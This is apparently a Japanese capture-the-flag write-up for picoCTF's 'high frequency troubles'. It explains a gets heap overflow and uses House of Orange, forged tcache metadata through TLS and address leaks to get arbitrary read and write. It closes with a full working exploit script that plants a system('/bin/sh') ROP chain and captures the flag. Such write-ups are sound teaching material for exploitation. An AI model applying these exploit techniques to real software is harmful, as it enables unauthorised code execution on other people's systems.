# high frequency troubles:Binary Exploitation:500pts
Download the binary [here](hft).  
Download the source [here](main.c).  
Download libc [here](libc.so.6).  
Connect with the challenge instance here:  
`nc tethys.picoctf.net 50123`  

Hints  
1  
allocate a size greater than mp_.mmap_threshold  

# Solution
バイナリとlibc、ソースが配布される。  
まず初めにソースを見ると以下の通りであった。  
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

enum
{
    PKT_OPT_PING,
    PKT_OPT_ECHO,
    PKT_OPT_TRADE,
} typedef pkt_opt_t;

enum
{
    PKT_MSG_INFO,
    PKT_MSG_DATA,
} typedef pkt_msg_t;

struct
{
    size_t sz;
    uint64_t data[];
} typedef pkt_t;

const struct
{
    char *header;
    char *color;
} type_tbl[] = {
    [PKT_MSG_INFO] = {"PKT_INFO", "\x1b[1;34m"},
    [PKT_MSG_DATA] = {"PKT_DATA", "\x1b[1;33m"},
};

void putl(pkt_msg_t type, char *msg)
{
    printf("%s%s\x1b[m:[%s]\n", type_tbl[type].color, type_tbl[type].header, msg);
}

// gcc main.c -o hft -g
int main()
{
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    putl(PKT_MSG_INFO, "BOOT_SQ");

    for (;;)
    {
        putl(PKT_MSG_INFO, "PKT_RES");

        size_t sz = 0;
        fread(&sz, sizeof(size_t), 1, stdin);

        pkt_t *pkt = malloc(sz);
        pkt->sz = sz;
        gets(&pkt->data);

        switch (pkt->data[0])
        {
        case PKT_OPT_PING:
            putl(PKT_MSG_DATA, "PONG_OK");
            break;
        case PKT_OPT_ECHO:
            putl(PKT_MSG_DATA, (char *)&pkt->data[1]);
            break;
        default:
            putl(PKT_MSG_INFO, "E_INVAL");
            break;
        }
    }

    putl(PKT_MSG_INFO, "BOOT_EQ");
}
```
`pkt_t`なる構造体でユーザ入力のパケットを処理する通信アプリのようだ。  
初めにサイズを8バイト読み取る。  
```c
        size_t sz = 0;
        fread(&sz, sizeof(size_t), 1, stdin);
```
その後にサイズ分だけ`malloc`し、確保した領域にサイズを書き込んだ後、`gets`でオプションとデータ本体を書き込んでいる。  
```c
        pkt_t *pkt = malloc(sz);
        pkt->sz = sz;
        gets(&pkt->data);
```
ここに自明なヒープオーバーフローがある。  
後の処理はオプションの値により挙動を振り分けており、対応は以下となる。  
```
0x0000000000000000: PKT_OPT_PING
0x0000000000000001: PKT_OPT_ECHO
0xXXXXXXXXXXXXXXXX: PKT_OPT_TRADE?
```
値を出力する`PKT_OPT_ECHO`があるのでリークに利用できそうだ。  
まとめると、この問題はヒープオーバーフローでRCEするまでがゴールとなる。  
ただし`free`が呼ばれていないため一筋縄ではいかず、`gets`はヌル終端であるのでリークも簡単ではない。  
まずはヒープレイアウトを見るため以下のスクリプトtest.pyを用いる。  
```python
from ptrlib import *

elf = ELF("./hft")
libc = ELF("./libc.so.6")

sock = Process("./hft")

sock.sendafter(":[PKT_RES]\n", p64(0x18))
sock.sendline(p64(0x1) + b"satoki")

sock.sh()
```
実行後に別ターミナルからアタッチする。  
```bash
$ sudo gdb -q -p $(pidof hft)
~~~
pwndbg> vis
~~~
0x55555555a270  0x0000000000000000      0x0000000000000000      ................
0x55555555a280  0x0000000000000000      0x0000000000000000      ................
0x55555555a290  0x0000000000000000      0x0000000000000021      ........!.......
0x55555555a2a0  0x0000000000000018      0x0000000000000001      ................
0x55555555a2b0  0x0000696b6f746173      0x0000000000020d51      satoki..Q.......         <-- Top chunk
```
ソースの通りヒープから確保されている。  
まずは`free`がない点を解決するため調査すると、`malloc`時に`Top chunk`を書き換えて`_int_free`を呼び出すHouse of Orangeなる手法があるらしい。  
有識者の調査によると「`下位12-bitが壊れてなければassertionエラーは起きない！`」らしい。  
上記ヒープの`Top chunk`を`0x0000000000020d51`から`0x0000000000000d51`にオーバフローで書き換え、再度それより大きな`malloc`を行うと別の領域に新たなヒープが確保される。  
その際に、書き換えにより現在のヒープの下に別領域があると判定されるためヒープの結合が起こらず、残った`0xd51`が`free`されてfree listにつながる。  
何度でも`malloc`できるため、新たな領域を使い込みさらに新たな領域を確保する際にサイズをうまく書き換えると`tcachebins`や`unsortedbin`を自由に作ることができる。  
これで`free`がない点を解決できた。  
この操作を用いて、`unsortedbin`につなげて再度`malloc`するとヒープのアドレスがリークできる。  
```python
from ptrlib import *

elf = ELF("./hft")
libc = ELF("./libc.so.6")

sock = Process("./hft")

sock.sendafter(":[PKT_RES]\n", p64(0x18))
sock.sendline(p64(0x0) + b"A" * 8 + p64(0xd51))

sock.sendafter(":[PKT_RES]\n", p64(0xD29))
sock.sendline(p64(0x0))

sock.sendafter(":[PKT_RES]\n", p64(0x18))
sock.sendline(p64(0x1)[:-1])
sock.recvuntil(":[")
leak = sock.recvuntil("]\n", drop=True)
print(hex(u64(leak)))

sock.sh()
```
実行する。  
```bash
$ python test.py
[+] __init__: Successfully created new process (PID=153364)
0x55555555a2b0
PKT_INFO:[PKT_RES]
[ptrlib]$
```
ヒープは以下の通りであった。  
```bash
$ sudo gdb -q -p $(pidof hft)
~~~
pwndbg> vis
~~~
0x55555555a270  0x0000000000000000      0x0000000000000000      ................
0x55555555a280  0x0000000000000000      0x0000000000000000      ................
0x55555555a290  0x0000000000000000      0x0000000000000021      ........!.......
0x55555555a2a0  0x0000000000000018      0x0000000000000000      ................
0x55555555a2b0  0x4141414141414141      0x0000000000000021      AAAAAAAA!.......
0x55555555a2c0  0x0000000000000018      0x0000000000000001      ................
0x55555555a2d0  0x000055555555a2b0      0x0000000000000d11      ..UUUU..........         <-- unsortedbin[all][0]
0x55555555a2e0  0x00007ffff7facce0      0x00007ffff7facce0      ................
0x55555555a2f0  0x0000000000000000      0x0000000000000000      ................
0x55555555a300  0x0000000000000000      0x0000000000000000      ................
pwndbg> bins
~~~
tcachebins
empty
fastbins
empty
unsortedbin
all: 0x55555555a2d0 —▸ 0x7ffff7facce0 ◂— 0x55555555a2d0
smallbins
empty
largebins
empty
```
正確には不明だが、おそらく`largebins`などに振り分けられた際のfd_nextsizeなどが残っているようだ。
ヒープアドレスが手に入ったのでヒープベースアドレスを計算して用いることが可能となった。  
次にlibcアドレスをリークしたいが、現状の機能では難しい。  
ここで、`malloc`のみができるので0や膨大な数を確保してみる。  
すると、`0x21299`を`malloc`した際に確保される領域がヒープからlibcの近傍へ移動した。  
`0x21298`の場合  
```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x555555554000     0x555555555000 r--p     1000      0 /hft
~~~
    0x55555555a000     0x55555559d000 rw-p    43000      0 [heap]
    0x7ffff7d90000     0x7ffff7d93000 rw-p     3000      0 [anon_7ffff7d90]
    0x7ffff7d93000     0x7ffff7dbb000 r--p    28000      0 /libc.so.6
~~~
```
`0x21299`の場合  
```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x555555554000     0x555555555000 r--p     1000      0 /hft
~~~
    0x55555555a000     0x55555559d000 rw-p    43000      0 [heap]
    0x7ffff7d6e000     0x7ffff7d93000 rw-p    25000      0 [anon_7ffff7d6e]
    0x7ffff7d93000     0x7ffff7dbb000 r--p    28000      0 /libc.so.6
~~~
```
この挙動でlibcの領域まで食い込んで確保すればアドレスリークが達成できると喜ぶが、`malloc`の時点で足りなければ新しい領域が確保されるため不可能であった。  
残った手段はヒープオーバーフローでの書き換えだが、ヒープのアドレスしかわからないため壊すことしかできない。  
うまく壊せそうなアドレスがあるか探すと、libcより前に何らかのヒープアドレスがある。  
```
pwndbg> telescope 0x7ffff7d6e000 20000
00:0000│    0x7ffff7d6e000 ◂— 0x0
01:0008│    0x7ffff7d6e008 ◂— 0x22002
02:0010│ r9 0x7ffff7d6e010 ◂— 0x21299
03:0018│    0x7ffff7d6e018 ◂— 0x0
... ↓       17618 skipped
44d6:226b0│    0x7ffff7d906b0 —▸ 0x7ffff7fad580 —▸ 0x7ffff7fa9820 —▸ 0x7ffff7f6d1d7 ◂— 0x636d656d5f5f0043 /* 'C' */
44d7:226b8│    0x7ffff7d906b8 —▸ 0x7ffff7fb5340 (_res) ◂— 0x0
44d8:226c0│    0x7ffff7d906c0 ◂— 0x0
44d9:226c8│    0x7ffff7d906c8 —▸ 0x7ffff7f514c0 ◂— 0x100000000
44da:226d0│    0x7ffff7d906d0 —▸ 0x7ffff7f51ac0 ◂— 0x100000000
44db:226d8│    0x7ffff7d906d8 —▸ 0x7ffff7f523c0 ◂— 0x2000200020002
44dc:226e0│    0x7ffff7d906e0 ◂— 0x0
... ↓       2 skipped
44df:226f8│    0x7ffff7d906f8 —▸ 0x55555555a010 ◂— 0x0
44e0:22700│    0x7ffff7d90700 ◂— 0x0
44e1:22708│    0x7ffff7d90708 —▸ 0x7ffff7facc80 ◂— 0x0
44e2:22710│    0x7ffff7d90710 ◂— 0x0
... ↓       5 skipped
44e8:22740│    0x7ffff7d90740 ◂— 0x7ffff7d90740
44e9:22748│    0x7ffff7d90748 —▸ 0x7ffff7d91160 ◂— 0x1
44ea:22750│    0x7ffff7d90750 —▸ 0x7ffff7d90740 ◂— 0x7ffff7d90740
44eb:22758│    0x7ffff7d90758 ◂— 0x0
44ec:22760│    0x7ffff7d90760 ◂— 0x0
44ed:22768│    0x7ffff7d90768 ◂— 0xfc4ebc0b86d9f900
~~~
pwndbg> vmmap 0x7ffff7d906f8
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x55555555a000     0x55555559d000 rw-p    43000      0 [heap]
►   0x7ffff7d6e000     0x7ffff7d93000 rw-p    25000      0 [anon_7ffff7d6e] +0x226f8
    0x7ffff7d93000     0x7ffff7dbb000 r--p    28000      0 /mnt/c/Users/tsato/Downloads/DLLLLp/libc.so.6
```
これはTLS(Thread Local Storage)とよばれるスレッド固有の領域のようだ。  
マスターカナリアや`tcachebins`の管理領域へのポインタがあるらしい。  
うまく`tcachebins`を作り管理領域を見てやる。  
```python
from ptrlib import *

elf = ELF("./hft")
libc = ELF("./libc.so.6")

sock = Process("./hft")

sock.sendafter(":[PKT_RES]\n", p64(0xD28))
sock.sendline(p64(0x0) + b"A" * 0xD18 + p32(0x41))

sock.sendafter(":[PKT_RES]\n", p64(0x19))
sock.sendline(p64(0x0))

sock.sendafter(":[PKT_RES]\n", p64(0x22000))

sock.sh()
```
```bash
$ sudo gdb -q -p $(pidof hft)
~~~
pwndbg> bins
~~~
tcachebins
0x20 [  1]: 0x55555555afd0 ◂— 0x0
fastbins
empty
unsortedbin
empty
smallbins
empty
largebins
empty
~~~
pwndbg> telescope 0x7ffff7d6d000 20000
00:0000│    0x7ffff7d6d000 ◂— 0x0
01:0008│    0x7ffff7d6d008 ◂— 0x23002
02:0010│ r9 0x7ffff7d6d010 ◂— 0x22000
03:0018│    0x7ffff7d6d018 ◂— 0x0
... ↓       18130 skipped
46d6:236b0│    0x7ffff7d906b0 —▸ 0x7ffff7fad580 —▸ 0x7ffff7fa9820 —▸ 0x7ffff7f6d1d7 ◂— 0x636d656d5f5f0043 /* 'C' */
46d7:236b8│    0x7ffff7d906b8 —▸ 0x7ffff7fb5340 (_res) ◂— 0x0
46d8:236c0│    0x7ffff7d906c0 ◂— 0x0
46d9:236c8│    0x7ffff7d906c8 —▸ 0x7ffff7f514c0 ◂— 0x100000000
46da:236d0│    0x7ffff7d906d0 —▸ 0x7ffff7f51ac0 ◂— 0x100000000
46db:236d8│    0x7ffff7d906d8 —▸ 0x7ffff7f523c0 ◂— 0x2000200020002
46dc:236e0│    0x7ffff7d906e0 ◂— 0x0
... ↓       2 skipped
46df:236f8│    0x7ffff7d906f8 —▸ 0x55555555a010 ◂— 0x1
~~~
pwndbg> x/32xg 0x55555555a010
0x55555555a010: 0x0000000000000001      0x0000000000000000
0x55555555a020: 0x0000000000000000      0x0000000000000000
0x55555555a030: 0x0000000000000000      0x0000000000000000
0x55555555a040: 0x0000000000000000      0x0000000000000000
0x55555555a050: 0x0000000000000000      0x0000000000000000
0x55555555a060: 0x0000000000000000      0x0000000000000000
0x55555555a070: 0x0000000000000000      0x0000000000000000
0x55555555a080: 0x0000000000000000      0x0000000000000000
0x55555555a090: 0x000055555555afd0      0x0000000000000000
~~~
```
TLSのリンク先から、`tcachebins`の個数とリンク先がヒープ上で管理されている。  
この構造を偽装して`malloc`すれば、任意の個所を`tcachebins`と誤認させて確保できそうだ。  
幸いなことに膨大な数を`malloc`した際の領域から、そのままオーバーフローでTLSに書き込める。  
また、膨大な数を`malloc`することは複数回繰り返せる。  
`PKT_OPT_PING`でデータを書き込め、`PKT_OPT_ECHO`でデータを出力できるので実質的にAAR、AAWが可能となった。  
あとは以下の流れを上記テクニックを複数回用いて行うだけである。  

1. ヒープ上にlibcのアドレスを乗せてAARで読み取る  
2. libc上のスタックアドレスをAARで読み取る
3. スタックアドレスからリターンアドレスを計算しAAWでROPを書き込む

注意点としては`malloc`した領域にサイズ情報も書き込まれるため、指定したアドレスから8バイトずれる。  
また、オプションの指定も必要なので、さらに8バイトずれた個所から書き込めると思っておくとよい。  
libcアドレスのリークでは、AARの際にサイズ情報とオプションで値が壊れるので`unsortedbin`からリークすると落ちる。  
そのため、`largebins`をに二つ繋いで後ろのチャンクを読み取る。  
リンクの整合性確認は不明だが、これ以降は`smallbins`でやり取りすれば問題ない。  
以下のexploit.pyで行う。  
```python
from ptrlib import *

elf = ELF("./hft")
libc = ELF("./libc.so.6")
# libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

sock = Socket("nc tethys.picoctf.net 50123")
# sock = Process("./hft")

sock.sendafter(":[PKT_RES]\n", p64(0xD28))
sock.sendline(p64(0x0) + b"A" * 0xD18 + p32(0x41))  # tamper the size of top chunk

# _int_free: tcachebins[0x20]
sock.sendafter(":[PKT_RES]\n", p64(0xBB0))
sock.sendline(p64(0x0) + b"B" * 0xBA8 + p32(0x441))  # tamper the size of top chunk

# _int_free: unsortedbin
sock.sendafter(":[PKT_RES]\n", p64(0x419))
sock.sendline(p64(0x3)[:-1])

# heap base address leak
sock.sendafter(":[PKT_RES]\n", p64(0x19))
sock.sendline(p64(0x1)[:-1])
sock.recvuntil(":[")
leak = sock.recvuntil("]\n", drop=True)
# logger.info(f"heap leak address: {hex(u64(leak))}")
heap_base = u64(leak) - 0x21BC0
logger.info(f"heap base address: {hex(heap_base)}")

sock.sendafter(":[PKT_RES]\n", p64(0x780))
sock.sendline(p64(0x0) + b"C" * 0x778 + p32(0x441))  # tamper the size of top chunk

# _int_free: largebins
sock.sendafter(":[PKT_RES]\n", p64(0xBB0))
sock.sendline(p64(0x0) + b"D" * 0xBA8 + p32(0x441))  # tamper the size of top chunk

# _int_free: largebins
sock.sendafter(":[PKT_RES]\n", p64(0xBB0))
sock.sendline(p64(0x3)[:-1])

# fake tcachebins controller no.1
sock.sendafter(":[PKT_RES]\n", p64(0x90))
sock.sendline(
    p64(0x1) + p64(0x1) + p64(0x0) * 0xF + p64(heap_base + 0x65BC0)[:-1]
)  # largebins address

# allocate front of tls & tamper the fake tcachebins controller no.1
sock.sendafter(":[PKT_RES]\n", p64(0x22000))
sock.sendline(
    p64(0x0) + b"E" * 0x236D8 + p64(heap_base + 0x21C10)[:-1]
)  # -> fake tcachebins controller no.1

# libc base address leak
sock.sendafter(":[PKT_RES]\n", p64(0x18))
sock.sendline(p64(0x1)[:-1])
sock.recvuntil(":[")
leak = sock.recvuntil("]\n", drop=True)
# logger.info(f"libc leak address: {hex(u64(leak))}")
libc.base = u64(leak) - 0x21A0D0

# fake tcachebins controller no.2
sock.sendafter(":[PKT_RES]\n", p64(0x90))
sock.sendline(
    p64(0x1) + p64(0x1) + p64(0x0) * 0xF + p64(libc.base + 0x21AA10)[:-1]
)  # libc address (on stack address)

# tamper the fake tcachebins controller
sock.sendafter(":[PKT_RES]\n", p64(0x22000))
sock.sendline(
    p64(0x0) + b"F" * 0x466D8 + p64(heap_base + 0x21CB0)[:-1]
)  # -> fake tcachebins controller no.2

# stack address leak
sock.sendafter(":[PKT_RES]\n", p64(0x18))
sock.sendline(p64(0x1)[:-1])
sock.recvuntil(":[")
stack_leak = sock.recvuntil("]\n", drop=True)
logger.info(f"stack leak address: {hex(u64(stack_leak))}")
return_address = u64(stack_leak) - 0x150
logger.info(f"return address: {hex(return_address)}")

# fake tcachebins controller no.3
sock.sendafter(":[PKT_RES]\n", p64(0x90))
sock.sendline(
    p64(0x1) + p64(0x1) + p64(0x0) * 0xF + p64(return_address - 0x18)[:-1]
)  # return address - 0x18

# tamper the fake tcachebins controller
sock.sendafter(":[PKT_RES]\n", p64(0x22000))
sock.sendline(
    p64(0x0) + b"G" * 0x696D8 + p64(heap_base + 0x21D50)[:-1]
)  # -> fake tcachebins controller no.3

# tamper the return address
sock.sendafter(":[PKT_RES]\n", p64(0x18))
payload = p64(next(libc.gadget("pop rdi; ret;")))
payload += p64(next(libc.search("/bin/sh")))
payload += p64(next(libc.gadget("ret;")))
payload += p64(libc.symbol("system"))
sock.sendline(p64(0x0) + b"H" * 0x18 + payload)

sock.sh()
```
実行する。  
```bash
$ python exploit.py
[+] __init__: Successfully connected to tethys.picoctf.net:50123
[+] <module>: heap base address: 0x558993106000
[+] base: New base address: 0x7fd70d34c000
[+] <module>: stack leak address: 0x7ffe36a47c98
[+] <module>: return address: 0x7ffe36a47b48
[ptrlib]$ ls
[ptrlib]$ Makefile
artifacts.tar.gz
flag.txt
hft
libc.so.6
main.c
metadata.json
profile
cat flag.txt
[ptrlib]$ picoCTF{mm4p_mm4573r_de3d190b}
```
シェルが取れ、flag.txtにflagが書かれていた。  

## picoCTF{mm4p_mm4573r_de3d190b}